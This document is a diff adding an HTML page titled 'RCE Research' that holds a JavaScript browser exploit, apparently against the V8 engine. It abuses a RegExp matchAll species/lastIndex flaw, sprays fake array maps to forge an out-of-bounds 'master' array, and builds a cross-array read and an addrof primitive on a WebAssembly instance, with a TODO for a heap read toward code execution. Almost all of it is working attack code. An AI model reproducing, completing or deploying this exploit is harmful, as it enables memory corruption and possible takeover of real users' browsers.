@@ -1,0 +1,108 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>RCE Research</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function hex(n){return"0x"+(n>>>0).toString(16);}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+
+const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
+const PIN_A=0x1100011;  // dblA FDA address in LO space
+const PIN_B=0x1200011;  // dblB FDA address in LO space (after dblA)
+const MAXS=0x7fdffffe;
+
+// Two LO-space double arrays
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const dblB=new Array(0x4000);for(let i=0;i<dblB.length;i++)dblB[i]=50.5+i*0.002;
+
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+
+// Spray: master.elements = PIN_A
+const cycle0=w2f(DMAP,EMPTY);
+const cycle1=w2f(PIN_A,MAXS);
+const sk=[];
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);for(let j=1;j<a.length;j+=2)a[j]=cycle1;sk.push(a);}}
+
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+spray();spray();spray();
+
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+
+if(Array.isArray(m)){
+  log("L: "+m.length);
+
+  // master reads from PIN_A (0x1100011). dblB's FDA is at PIN_B (0x1200011).
+  // Index to reach dblB's FDA header: (PIN_B - PIN_A) / 8 = 0x100000/8 = 0x20000
+  // But PIN_B is untagged = 0x1200010. PIN_A untagged = 0x1100010.
+  // master[k] reads from 0x1100010 + 8 + k*8 = 0x1100018 + k*8
+  // To read 0x1200010: k = (0x1200010 - 0x1100018) / 8 = 0xFFFF8/8 = 0x1FFFF
+  // To read 0x1200018 (dblB first slot): k = (0x1200018 - 0x1100018) / 8 = 0x20000
+
+  const dblB_header_idx = 0x1FFFF;  // reads dblB FDA map+length
+  const dblB_slot0_idx = 0x20000;   // reads dblB[0] raw double
+
+  // Verify: read dblB's first slot (should be 50.5)
+  const slot0 = m[dblB_slot0_idx];
+  log("dblB[0]_via_master: "+slot0);  // should be 50.5
+
+  if(Math.abs(slot0 - 50.5) < 0.01){
+    log("CROSS_ARRAY_READ_OK");
+
+    // Now: addrof via map transition
+    // Step 1: transition dblB to PACKED_ELEMENTS by storing an object
+    dblB[0] = wasmI;  // V8 transitions dblB's map to PACKED_ELEMENTS
+
+    // Step 2: read dblB[0] as raw double via master
+    // After transition, dblB[0] is a tagged pointer (compressed)
+    // master reads the raw 8 bytes at that slot
+    const rawPtr = f2i(m[dblB_slot0_idx]);
+    const wasmAddr = rawPtr & 0xffffffffn;  // low 32 bits = compressed pointer
+    log("WASM_ADDR: "+wasmAddr.toString(16));
+
+    // Step 3: restore dblB[0] to a double to avoid GC issues
+    dblB[0] = 50.5;
+
+    // Verify wasm still works
+    log("W: "+wasmI.exports.f());
+
+    if(wasmAddr > 0x1000n && wasmAddr < 0x10000000n){
+      log("ADDROF_ACHIEVED");
+
+      // Now we have addrof! Next: heapRead via modifying victim's elements
+      // But first, let's demonstrate by reading wasmInstance fields
+      // TODO: implement heapRead by using master to modify dblA's backing store
+      // to create a second fake array pointing to wasmAddr
+    }
+  }else{
+    log("dblB_mismatch: expected 50.5 got "+slot0);
+    // Maybe PIN_B is at a different offset. Check nearby indices.
+    for(let k=0x1FFF0;k<=0x20010;k++){
+      try{
+        const v=m[k];
+        if(Math.abs(v-50.5)<0.01){log("FOUND_dblB_at_idx: "+hex(k));break;}
+      }catch(e){break;}
+    }
+  }
+}else{
+  log("NO_ARRAY");
+}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
